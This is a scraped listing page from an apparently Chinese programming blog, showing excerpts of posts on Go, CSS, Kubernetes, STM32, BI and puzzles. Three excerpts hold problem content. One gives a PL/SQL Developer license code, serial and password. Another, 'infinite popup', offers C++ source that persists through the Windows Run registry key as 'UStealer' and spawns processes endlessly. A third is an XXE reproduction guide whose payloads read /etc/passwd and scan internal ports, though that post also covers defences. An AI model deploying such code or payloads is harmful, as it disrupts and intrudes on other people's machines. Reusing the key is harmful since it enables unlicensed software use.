登陆PLSQL 双击桌面的PLSQL
输入账号口令。数据库为orcl
登录成功，让填写注册码
按下面内容填进去：
product code： 4vkjwhfeh3ufnqnmpr9brvcuyujrx3n3le serial Number：226959 password: xs374ca
选择Register
连接成功
点击这个图标，进入Preferences界面
点击下拉框选择oracle home 路径及OCI library，这两项是之前Oracle client安装的路径，无需自己填写，点击下拉框一般会自己显示，如果没有显示，很大可能是client配置不当或安装失败
然后重启PLSQL，大功告成
友情提示:
汉化只需要选择Appearnce(外观)，language选择chinese，然后apply，ok即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d9324a826fbc4b4ba4037878375e228/" rel="bookmark">
			无限弹窗-C&#43;&#43;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		设置了开机自启动，不过电脑应该扛得住，(作者已尝试)
#include&lt;windows.h&gt;
#include&lt;conio.h&gt;
#include&lt;stdio.h&gt;
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
void HKRunator(char *programName)
{
HKEY hkey=NULL;
DWORD rc;
rc=RegCreateKeyEx(HKEY_LOCAL_MACHINE,
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
0,
NULL,
REG_OPTION_NON_VOLATILE,
KEY_ALL_ACCESS,
NULL,
&amp;hkey,
NULL);
if (rc==ERROR_SUCCESS) {
rc=RegSetValueEx(hkey,
"UStealer",
0,
REG_SZ,
(const BYTE *)programName,
strlen(programName));
if (rc==ERROR_SUCCESS)
{
RegCloseKey(hkey);
}
}
return;
}
int main(int argc,char **argv)
{
HKRunator(*argv);
if(MessageBox(NULL,"OK","Box",MB_YESNO)==IDNO)
{
return 0;
}
while(true)
{
system("start");
}
return 0;
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebd46aa3bd580391a20bc33b398f6cfe/" rel="bookmark">
			XXE漏洞复现步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0X00XXE注入定义
XXE注入，即XML External Entity，XML外部实体注入。通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。
0X01漏洞原理
既然XML可以从外部读取DTD文件，那我们就自然地想到了如果将路径换成另一个文件的路径，那么服务器在解析这个XML的时候就会把那个文件的内容赋值给SYSTEM前面的根元素中，只要我们在XML中让前面的根元素的内容显示出来，不就可以读取那个文件的内容了。这就造成了一个任意文件读取的漏洞。
那如果我们指向的是一个内网主机的端口呢？是否会给出错误信息，我们是不是可以从错误信息上来判断内网主机这个端口是否开放，这就造成了一个内部端口被探测的问题。另外，一般来说，服务器解析XML有两种方式，一种是一次性将整个XML加载进内存中，进行解析；另一种是一部分一部分的、“流式”地加载、解析。如果我们递归地调用XML定义，一次性调用巨量的定义，那么服务器的内存就会被消耗完，造成了拒绝服务攻击。
0X02漏洞复现
发送测试代码到测试服务器
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt; ]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; 在有回显的情况下，该服务器的/etc/passwd文件就会被泄露。
此时发现有回显，开始测试xxe漏洞，抓取数据包发现post一个xml文件
将xml代码换成测试的xml代码
将其提交发现有回显，回显内容是xml代码里面的函数访问文件夹的内容。
修改xml内容进行端口检测。
&lt;!DOCTYPE foo [&lt;!ELEMENT login ANY&gt;&lt;!ENTITY xxe SYSTEM "http://192.168.1.42:801"&gt;]&gt; &lt;reset&gt;&lt;login&gt;&amp;xxe;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; 发现801端口关闭
&lt;!DOCTYPE foo [&lt;!ELEMENT login ANY&gt;&lt;!ENTITY xxe SYSTEM "http://192.168.1.42:80"&gt;]&gt; &lt;reset&gt;&lt;login&gt;&amp;xxe;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; 发现80端口开启
0X03漏洞防御
1.使用开发语言提供的禁用外部实体的方法
PHP：
libxml_disable_entity_loader(true); JAVA:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ebd46aa3bd580391a20bc33b398f6cfe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cb5d72f6e46a140f6da4eeaa2038ef8/" rel="bookmark">
			【【用51单片机实现小黑子动态图象】】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用51单片机实现小黑子动态图象首先我们试试用纯文字的实现方式 0x00,0x00,0xF9,0x8A,0x8C,0x8C,0x8A,0xF9,0x00,0x00,0x00,0xFF,0x93,0x95,0xF9,0x95,
0x93,0xFF,0x00,0x00,0x80,0x40,0x20,0x1F,0x20,0x40,0x80,0x1F,0x11,0x11,0x1F,0x00,
0x1F,0x01,0x01,0x1F,0x00,0x00,0x11,0x12,0x14,0xFA,0x19,0x14,0x12,0x11,0x00,0x00,
0x00,0x28,0x2A,0xBB,0x7E,0xBB,0x2A,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
这是纯文字的，文字版本就不在这里赘述了，懂得都懂
类似的复制粘贴
对于动态图像 我用的文字取模一帧一帧实现的
下面是函数全部主体
main.c
#include &lt;REGX52.H&gt; #include "Delay.h" #include "MatrixLED.h" //动画数据 unsigned char code Animation[]={ 0x0C,0xD3,0xFC,0xD2,0x09,0x18,0x18,0x00, 0x00,0x0C,0x0C,0x09,0xD2,0xFC,0xD3,0x0C, 0x00,0x38,0x38,0x09,0xD2,0xFC,0xD3,0x0C, 0x0C,0xD3,0xFC,0xD2,0x21,0xC0,0xC0,0x00, 0x00,0x05,0x0A,0xD7,0xFB,0xDC,0x03,0x00, 0x00,0x38,0x38,0x09,0xD2,0xFC,0xD3,0x0C, 0x00,0x0B,0xDC,0xFB,0xD7,0x0A,0x05,0x00, 0x00,0x20,0x7F,0xF8,0xB4,0x02,0x01,0x01, 0x00,0x00,0x19,0x3F,0x7C,0x57,0x01,0x00, 0x00,0x00,0x01,0x02,0x1C,0x3C,0x7B,0x58, 0x00,0x00,0x19,0x3F,0x7C,0x57,0x01,0x00, 0x00,0x00,0x19,0x3F,0x7C,0x57,0x01,0x00, 0x20,0x10,0x20,0xFF,0xFC,0x26,0x12,0x08, 0x00,0xC0,0x20,0xFF,0xFA,0x24,0xC0,0x00, 0x00,0x00,0x30,0x7F,0xFE,0xA2,0x01,0x00, 0x00,0x07,0x34,0x78,0xF8,0xB6,0x01,0x00, 0x00,0x00,0x01,0x02,0x1C,0x3C,0x7B,0x58, 0x00,0x07,0x34,0x78,0xF8,0xB6,0x01,0x00, 0x00,0x00,0x01,0x02,0x1C,0x3C,0x7B,0x58, 0x00,0x07,0x34,0x78,0xF8,0xB6,0x01,0x00, 0x00,0x00,0x01,0x02,0x1C,0x3C,0x7B,0x58, }; void main() { unsigned char i,Offset=0,Count=0; MatrixLED_Init(); while(1) { for(i=0;i&lt;8;i++)	{ MatrixLED_ShowColumn(i,Animation[i+Offset]); } Count++;	if(Count&gt;30) { Count=0; Offset+=8;	if(Offset&gt;160) { Offset=0; } } } } Delay.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9cb5d72f6e46a140f6da4eeaa2038ef8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ff414ca3dfc35ae2a31ea6de1bbd15a/" rel="bookmark">
			数据驱动的商业决策：BI在企业中的重要性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一章：引言
在当今数字化时代，数据被广泛应用于各个行业和领域。对企业而言，数据是一项宝贵的资源，可以为其带来无限的商机和竞争优势。然而，海量的数据本身并不具备实际意义，只有通过有效的数据分析和洞察，才能转化为有价值的商业决策。商业智能（Business Intelligence，简称BI）作为一种数据驱动的方法和工具，在企业中扮演着至关重要的角色。本文将探讨BI在企业中的重要性，并通过技术案例和代码示例来支持论点。
第二章：什么是商业智能（BI）？
商业智能（BI）是指通过收集、整理、分析和展示企业内外部数据，以支持决策制定和业务优化的一套技术和方法。BI的核心目标是将数据转化为洞察，帮助企业高效地做出决策，并为业务发展提供指导。BI系统通常由数据仓库、数据分析工具和可视化平台组成，提供了一站式的数据管理和分析解决方案。
第三章：BI在企业中的重要性
提供全面的数据洞察
BI系统能够从各个数据源中收集和整合数据，包括企业内部的销售数据、客户数据、供应链数据等，以及外部的市场趋势、竞争对手数据等。通过对这些数据的分析和挖掘，BI系统能够提供全面的数据洞察，帮助企业了解当前的业务状况和市场动态，以便做出准确的决策。
案例：某电商企业通过BI系统分析销售数据，发现某个产品在特定地区的销售量出现大幅增长。基于这个洞察，企业调整了库存策略，并加大对该地区的市场推广力度，最终取得了显著的销售增长。
支持实时决策
传统的决策制定通常依赖于经验和直觉，但这种方式往往无法及时反映变化的商业环境。BI系统通过数据的实时更新和分析，可以提供实时的业务指标和报告，帮助企业管理者做出迅速的决策。
案例：一家快餐连锁企业通过BI系统监控每个分店的销售数据和成本数据，并与实时天气数据相结合。当天气预报显示某地将会有大雨时，BI系统自动分析该地区分店的销售数据，发现在下雨天，冰淇淋和热饮的销售量会显著下降。基于这个洞察，企业及时调整了该地区分店的库存和营销活动，避免了不必要的损失。
发现潜在机会和问题
通过对大量数据的深入分析，BI系统可以揭示潜在的商机和问题，帮助企业捕捉市场机会和解决潜在的风险。无论是发现新的市场细分、挖掘客户行为模式，还是识别供应链中的瓶颈和风险点，BI系统都能够提供关键的信息和洞察。
案例：一家金融机构通过BI系统分析客户的交易数据和行为模式，发现某一类客户在近期开始频繁进行小额投资。基于这个洞察，机构推出了专门针对这类客户的理财产品，并在短时间内获得了可观的市场份额。
第四章：BI的技术支持
数据采集和整合
BI系统的核心是数据的采集和整合。企业需要建立稳定和高效的数据管道，从各个数据源中提取数据，并进行清洗和转换，以确保数据的质量和一致性。
示例代码：
import pandas as pd
# 从数据库中提取销售数据
sales_data = pd.read_sql_query("SELECT * FROM sales", db_connection)
# 数据清洗和转换
cleaned_data = sales_data.dropna() # 删除缺失值
transformed_data = cleaned_data.groupby("product").sum() # 按产品分组求和
# 将数据存储到数据仓库
transformed_data.to_csv("sales_data_warehouse.csv")
数据分析和挖掘
BI系统需要提供强大的数据分析和挖掘功能，以帮助企业发现数据背后的规律和洞察。这包括基本的统计分析、数据建模和预测分析等技术手段。
示例代码：
import numpy as np
import matplotlib.pyplot as plt
# 数据统计分析
mean_sales = np.mean(sales_data["sales"]) # 计算销售额平均值
max_sales = np.max(sales_data["sales"]) # 计算销售额最大值
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ff414ca3dfc35ae2a31ea6de1bbd15a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8a27dda65b8155772027f522f5bf81a/" rel="bookmark">
			解决阿里云oss图片浏览器访问直接下载而不是打开
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 关于阿里云OSS图片链接打开默认为下载的解决域名配置证书配置 关于阿里云OSS图片链接打开默认为下载的解决 【注意】这里解决方法前提是需要有域名，如果你没有，很抱歉这篇文章帮不到你
【警告】对于为图片设置content-type,或者content-disposition。这边已经尝试过了，都没有用
【说明】接下来主要是针对解决默认为直接浏览而不是下载的问题
域名配置 1️⃣：进入你的阿里云oss中的相关桶下，如下图所示：
2️⃣：点击绑定域名，然后输入你自己的域名即可，这里建议直接你申请一个二级域名进行绑定
3️⃣：绑定好后会进行验证，根据步骤进行一步一步的验证即可，这里说明一下，第一次验证是验证TXT的记录值，你只需在你的域名解析那里配置一下就行，如下图所示：
4️⃣：解析之后返回到阿里oss那里确认即可，然后下一步就是进行CNAME解析了。这里有两个注意点
这个解析是和你第一次解析记录类型为A的冲突，所以建议直接将记录类型为A的改为CNAME解析记录值，这里值的填写如下图 5️⃣：填写解析记录
证书配置 1️⃣：申请免费的证书，这里我就不多赘述了，对于下载证书文件，下载nginx相关的就行
2️⃣：然后还是在上面的阿里oss的那个页面进行证书配置就行，对于刚刚下载的证书只有csr文件用不到
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd8e06d884fdb9a0cade757206ebfd48/" rel="bookmark">
			STM32F407使用DMA加速刷新LVGL
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本人使用国产的实时操作系统RT-thread，屏幕使用的TFTLCD，屏幕IC是LIL9341
这里就不讲移植了，如果需要，请评论，后面出；
前提：移植好LCD，移植好LVGL（不适用DMA能正常显示） 使用STM32Cubemax配置DMA 上图中，Burst Size的具体配置根据芯片参考手册来选择，如果要用FIFO的话就需要选择
因为LVGL需要屏幕数据传输完后通知一下LVGL，所以这里要启用DMA中断
2、添加代码 2.1、注册DMA中断 /* *注册的是传输完成中断 *具体注册的中断服务函数在lv_port_disp.c中 */ HAL_DMA_RegisterCallback(&amp;hdma_memtomem_dma2_stream7, HAL_DMA_XFER_CPLT_CB_ID, LVGL_LCD_FSMC_DMA_pCallback); 2.2、lv_port_disp.c中添加代码 static void disp_flush(lv_disp_drv_t * disp_drv, const lv_area_t * area, lv_color_t * color_p) { LCD_Address_Set(area-&gt;x1,area-&gt;y1,area-&gt;x2,area-&gt;y2); //&lt;盖函数是设置LCD屏幕的扫描区域 HAL_DMA_Start_IT(&amp;hdma_memtomem_dma2_stream7, (uint32_t)color_p, (uint32_t)&amp;LCD-&gt;LCD_RAM, ((area-&gt;x2+1) - area-&gt;x1) * ((area-&gt;y2+1) - area-&gt;y1)); } void LVGL_LCD_FSMC_DMA_pCallback(DMA_HandleTypeDef *_hdma) { lv_disp_flush_ready(&amp;disp_drv1); } /* 在LCD驱动文件中添加 */ void LCD_Address_Set(uint16_t x1,uint16_t y1,uint16_t x2,uint16_t y2) { LCD_WR_REG(0x2a);//列地址设置 LCD_WR_DATA(x1&gt;&gt;8); LCD_WR_DATA(x1&amp;0x00ff); LCD_WR_DATA(x2&gt;&gt;8); LCD_WR_DATA(x2&amp;0x00ff); LCD_WR_REG(0x2b);//行地址设置 LCD_WR_DATA(y1&gt;&gt;8); LCD_WR_DATA(y1&amp;0x00ff); LCD_WR_DATA(y2&gt;&gt;8); LCD_WR_DATA(y2&amp;0x00ff); LCD_WR_REG(0x2c);//储存器写(2C命令之后开始写颜色数据) } 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd8e06d884fdb9a0cade757206ebfd48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c5f045056e1cf3e8a6f0f5733ecf89a/" rel="bookmark">
			三种css 文本处理方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		中文符号布局换号
overflow: hidden;
text-overflow: ellipsis;
display: -webkit-box;
-webkit-box-orient: vertical;
-webkit-line-clamp: 2;
word-wrap:break-word;
word-break:break-all;
多行添加省略号
overflow : hidden;
text-overflow: ellipsis;
display: -webkit-box;
-webkit-line-clamp: 2;
-webkit-box-orient: vertical;
内容超出添加省略号
1.使用overflow: hidden把超出的内容进行隐藏；
2.然后使用white-space: nowrap设置内容不换行；
3.最后使用text-overflow: ellipsis设置超出内容为省略号
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e27a835b7581551f746e0a195365f2f/" rel="bookmark">
			节流和防抖
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		节流： 节流可以限制一个函数在一定时间内只执行一次，即使该函数被重复触发，也只会执行一次。在一个事件被大量触发的时候，可以使用节流来避免事件频繁触发而导致性能问题。
常见的应用场景包括：
用户频繁滚动页面，但是需要做些较为重要的处理时，可以使用节流来减少计算次数；在搜索框输入过程中，如果每次输入都会触发请求，就会导致请求频繁，可以使用节流来控制请求的发送次数。 防抖： 防抖是指在一段时间内，如果一个函数被连续调用多次，只有最后一次调用被执行，其他的都被忽略。在一个事件频繁触发的时候，可以使用防抖来避免不必要的重复计算。
常见的应用场景包括：
在输入框中输入文字时，文本框的内容会实时变化，可以使用防抖来控制输入的处理次数；在窗口调整大小的时候，窗口大小变化会不断触发，可以使用防抖来避免频繁的计算和渲染。 总之，节流和防抖都是通过函数的调用规则来优化前端性能的方法，它们的核心思想都是避免过度使用计算资源。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9952564254bc830b8ff2a0568831cf1/" rel="bookmark">
			Golang -＞ Golang 变量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Golang 变量 Golang 变量使用的三种方式变量的声明，初始化和赋值程序中 + 号的使用数据类型的基本介绍int 的无符号的类型：int 的其它类型的说明:整型的使用细节 小数类型/浮点型小数类型分类浮点型使用细节 字符类型字符类型使用细节字符类型本质探讨 布尔类型string 类型string 使用注意事项和细节字符串的两种表示形式 基本数据类型的默认值基本数据类型的相互转换基本语法基本数据类型相互转换的注意事项 数据类型和 string 的转换string 类型转基本数据类型string 转基本数据类型的注意事项 指针指针的使用细节 值类型和引用类型 案例：
Golang 变量使用的三种方式 第一种：指定变量类型，声明后若不赋值，使用默认值
Golang 的变量如果没有赋初值，编译器会使用默认值比如 int 默认值 0, string 默认值为空串, 小数默认为 0
第二种：根据值自行判定变量类型(类型推导) , 不使用默认值
第三种：省略 var
注意 :=左侧的变量不应该是已经声明过的，否则会导致编译错误
第四种: 多变量声明
在编程中，有时我们需要一次性声明多个变量，Golang 也提供这样的语法
变量的声明，初始化和赋值 程序中 + 号的使用 package main import "fmt" //演示golang中+的使用 func main() { var i = 1 var j = 2 var r = i + j //做加法运算 fmt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9952564254bc830b8ff2a0568831cf1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b063614dbd833ac2c85771b4faee164d/" rel="bookmark">
			Golang -＞ Go 语言快速开发入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Go 语言快速开发入门 开发一个 hello.go 程序Golang 执行流程分析两种执行流程的方式区别:编译和运行说明 Go 程序开发的注意事项注释行注释多行注释 开发一个 hello.go 程序 package main import "fmt" func main() { fmt.Print("hello") } 输出: hello 对上图的说明
go 文件的后缀是 .gopackage main 表示该 hello.go 文件所在的包是 main, 在 go 中，每个文件都必须归属于一个包。import “fmt” 表示：引入一个包，包名 fmt, 引入该包后，就可以使用 fmt 包的函数 比如：fmt.Println func main() { } func 是一个关键字，表示一个函数。main 是函数名，是一个主函数，即我们程序的入口。 fmt.Println(“hello”) 表示调用 fmt 包的函数 Println 输出 hello,world Golang 执行流程分析 如果是对源码编译后，再执行，Go 的执行流程如下图
如果我们是对源码直接 执行 go run 源码，Go 的执行流程如下图
两种执行流程的方式区别: 如果我们先编译生成了可执行文件，那么我们可以将该可执行文件拷贝到没有 go 开发环境的机 器上，仍然可以运行如果我们是直接 go run go 源代码，那么如果要在另外一个机器上这么运行，也需要 go 开发 环境，否则无法执行。在编译时，编译器会将程序运行依赖的库文件包含在可执行文件中，所以，可执行文件变大了 很多。 编译和运行说明 有了 go 源文件，通过编译器将其编译成机器可以识别的二进制码文件。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b063614dbd833ac2c85771b4faee164d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c81a09aba8ec42ad0e811f54a2781aa3/" rel="bookmark">
			Golang -＞ Golang 的概述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Golang 的概述 Golang 的语言的特点Golang 的开发工具Golang 的版本 Golang 的语言的特点 简介：
Go 语言保证了既能到达静态编译语言的安全和性能，又达到了动态语言开发维护的高效率
使用一个表达式来形容 Go 语言：Go = C + Python
说明 Go 语言既有 C 静态语言程 序的运行速度，又能达到 Python 动态语言的快速开发。
从 C 语言中继承了很多理念，包括表达式语法，控制结构，基础数据类型，调用参数传值，指针等 等，也保留了和 C 语言一样的编译执行方式及弱化的指针
举一个案例(体验)：
//go 语言的指针的使用特点(体验) func testPtr(num *int) { num = 20 } 引入包的概念，用于组织程序结构，Go 语言的一个文件都要归属于一个包，而不能单独存在。
垃圾回收机制，内存自动回收，不需开发人员管理
天然并发 (重要特点)
从语言层面支持并发，实现简单
goroutine，轻量级线程，可实现大并发处理，高效利用多核。
基于 CPS 并发模型(Communicating Sequential Processes )实现
吸收了管道通信机制，形成 Go 语言特有的管道 channel 通过管道 channel , 可以实现不同的 goroute 之间的相互通信。
函数可以返回多个值。举例：
//写一个函数，实现同时返回 和，差 //go 函数支持返回多个值 func getSumAndSub(n1 int, n2 int) (int, int ) { //go 语句后面不要带分号 sum := n1 + n2 sub := n1 - n2 return sum , sub } 新的创新：比如切片 slice、延时执行 defer Golang 的开发工具 goland Golang 的版本 选择最新的就可以环境变量
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57873996070675a491752fd514441d2a/" rel="bookmark">
			Kubernetes 实战（02）— 使用 Deployment、Service、Nginx Ingress Controller 搭建 MariaDB&#43;Nginx&#43;WordPress
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 知识点回顾 kubeadm 使用容器技术封装了 Kubernetes 组件，所以只要节点上安装了容器运行时（Docker、containerd 等），它就可以自动从网上拉取镜像，然后以容器的方式运行组件，非常简单方便。
Deployment 是用来管理 Pod 的一种对象，它代表了运维工作中最常见的一类在线业务，在集群中部署应用的多个实例，而且可以很容易地增加或者减少实例数量，从容应对流量压力。
Deployment 的定义里有两个关键字段：一个是 replicas，它指定了实例的数量；另一个是 selector，它的作用是使用标签“筛选”出被 Deployment 管理的 Pod，这是一种非常灵活的关联机制，实现了 API 对象之间的松耦合。
DaemonSet 是另一种部署在线业务的方式，它很类似 Deployment，但会在集群里的每一个节点上运行一个 Pod 实例，类似 Linux 系统里的“守护进程”，适合日志、监控等类型的应用。
DaemonSet 能够任意部署 Pod 的关键概念是“污点”（taint）和“容忍度”（toleration）。Node 会有各种“污点”，而 Pod 可以使用“容忍度”来忽略“污点”，合理使用这两个概念就可以调整 Pod 在集群里的部署策略。
由 Deployment 和 DaemonSet 部署的 Pod，在集群中处于“动态平衡”的状态，总数量保持恒定，但也有临时销毁重建的可能，所以 IP 地址是变化的，这就为微服务等应用架构带来了麻烦。
Service 是对 Pod IP 地址的抽象，它拥有一个固定的 IP 地址，再使用 iptables 规则把流量负载均衡到后面的 Pod，节点上的 kube-proxy 组件会实时维护被代理的 Pod 状态，保证 Service 只会转发给健康的 Pod。
Service 还基于 DNS 插件支持域名，所以客户端就不再需要关心 Pod 的具体情况，只要通过 Service 这个稳定的中间层，就能够访问到 Pod 提供的服务。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57873996070675a491752fd514441d2a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68277597bc2c70c1627a801f0b39d0a5/" rel="bookmark">
			内存屏障(Memory Barriers / Fences)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		是一种屏障指令，它使得CPU或编译器对屏障指令的前和后所发出的内存操作执行一个排序的约束。也叫内存栅栏或栅栏指令，volatile实现了Java内存模型中的可见性和有序性，但volatile无法保证原子性。
内存屏障之前的所有写操作都要回写到主内存，
内存屏障之后的所有读操作都能获得内存屏障之前的所有写操作的最新结果(实现了可见性)。
因此重排序时，不允许把内存屏障之后的指令重排序到内存屏障之前。
对一个 volatile 域的写, happens-before 于任意后续对这个 volatile 域的读，也叫写后读。
作用 阻止屏障两边的指令重排序写数据时加入屏障，强制将线程私有工作内存的数据刷回主物理内存读数据时加入屏障，线程私有工作内存的数据失效，重新到主物理内存中获取最新数据 happens-before 之 volatile 变量规则 第一个操作
普通读写
volatile读
volatile写
普通读写
可以重排
可以重排
不可以重排
volatile读
不可以重排
不可以重排
不可以重排
volatile2写
可以重排
不可以重排
不可以重排
当第一个操作为volatile读时，不论第二个操作是什么，都不能重排序。这个操作保证了volatile读之后的操作不会被重排到volatile读之前。
当第二个操作为volatile写时，不论第一个操作是什么，都不能重排序。这个操作保证了volatile写之前的操作不会被重排到volatile写之后。
当第一个操作为volatile写时，第二个操作为volatile读时，不能重排。
四大内存屏障 屏障类型
指令示例
说明
LoadLoad
Load1;LoadLoad;Load2
保证load1的读取操作在load2及后续读取操作之前执行
StoreStore
Store1;StoreStore;Store2
在store2及其后的写操作执行前，保证store1的写操作已刷新到主内存
LoadStore
Load1;LoadStore;Store2
在stroe2及其后的写操作执行前，保证load1的读操作已读取结束
StoreLoad
Store1;StoreLoad;Load2
保证store1的写操作已刷新到主内存之后，Ioad2及其后的读操作才能执行
写 1. 在每个 volatile 写操作的前⾯插⼊⼀个 StoreStore 屏障
StoreStore Barriers Storel;StoreStore;Store2
禁止重排序：一定是Storel的数据写出到主内存完成后，才能让Store.2
及其之后的写出操作的数据，被其它线程看到。
保证Stor1指令写出去的数据，会强制被刷新回到主内存中
2. 在每个 volatile 写操作的后⾯插⼊⼀个 StoreLoad 屏障
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/68277597bc2c70c1627a801f0b39d0a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd934089b301010804ab88527b41ae03/" rel="bookmark">
			AJAX同步和异步
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.AJAX 简介 1.1同步和异步
* (一): 同步与异步 * 1. 同步: 顺序执行, 优点: 静态预判结果可控, 缺点: 耗时任务阻塞执行 * 2. 异步: 乱序执行, 优点: 不会阻塞代码,体验好, 缺点: 顺序不可控 * * 以银行排队办业务为例 * 1. 同步: 默认排队叫号, 依次办理 * 2. 异步: 耗时任务(如修改密码忘带身份证)则离开队列, 后面任务继续 * 3. 任务队列: 取了身份证回来了, 就待在"任务队列"中等待再次叫号 * * 哪些是异步任务(耗时)? * 1. 定时任务: setTimeout, setInterval * 2. 事件监听: addEventListener * 3. 网络请求: ajax, promise,fetch * 4. 文件读写等涉及IO的操作 1.2 什么是JSON
// 1. json是通用的,轻量化的 "数据交互格式",用于 "前后端数据通信" // 2. json独立于编程语言,本质是一个格式化字符串 // 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd934089b301010804ab88527b41ae03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bbf13161463450e9c86b3f90597f774/" rel="bookmark">
			题目一：切面条
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目： 一根高筋拉面，中间切一刀，可以得到2根面条。 如果先对折1次，中间切一刀，可以得到3根面条。 如果连续对折2次，中间切一刀，可以得到5根面条。 那么，连续对折10次，中间切一刀，会得到多少面条呢？
分析： 对折2次，可得2根；对折1次，可得3根；对折2次，可得5根。
易总结出规律为2**i+1 (i为次数)
程序： for i in range(0,11): print('对折{}次后，所得面条数为:{}'.format(i,(2**i+1))) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7522e2943c10ceb6205624e68cf29dea/" rel="bookmark">
			题目四：方阵转置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目： 给定一个n×m矩阵相乘，求它的转置。其中1≤n≤20，1≤m≤20，矩阵中的每个元素都在整数类型（4字节）的表示范围内。
输入格式 第一行两个整数n和m；
第二行起，每行m个整数，共n行，表示n×m的矩阵。数据之间都用一个空格分隔。
输出格式 共m行，每行n个整数，数据间用一个空格分隔，表示转置后的矩阵。
样例输入 2 4 34 76 -54 7 -4 5 23 9 样例输出 34 -4 76 5 -54 23 7 9 分析： 思路一：
其实方阵的转置功能已经在python函数库里封装完成，即如果一个方阵A，则它的转置就是A.T。
思路二：
转置总的来说，就是2行4列变4行2列，也就是A[2][4]的函数转置以后变为A[4][2]的元素。
也就是A[i][j]=A[j][i]。以上就是程序的主要部分，要遍历所有的元素，肯定要循环遍历所有的i与j。
程序： A = np.array([[1,2,3], [4,5,6], [7,8,9]]) # print(A.shape[0],A.shape[1]) #思路一: print(A.T) #思路二: for i in range(A.shape[0]):#len(A[0])矩阵列数 for j in range(A.shape[1]):#len(A)矩阵行数 #转置就是A[i][j]和A[j][i]互换 A[i][j],A[j][i] = A[j][i],A[i][j] print(A) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42550434cd06a2034f09c04aa8127136/" rel="bookmark">
			题目三：门牌制作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目： 小蓝要为一条街的住户制作门牌号。
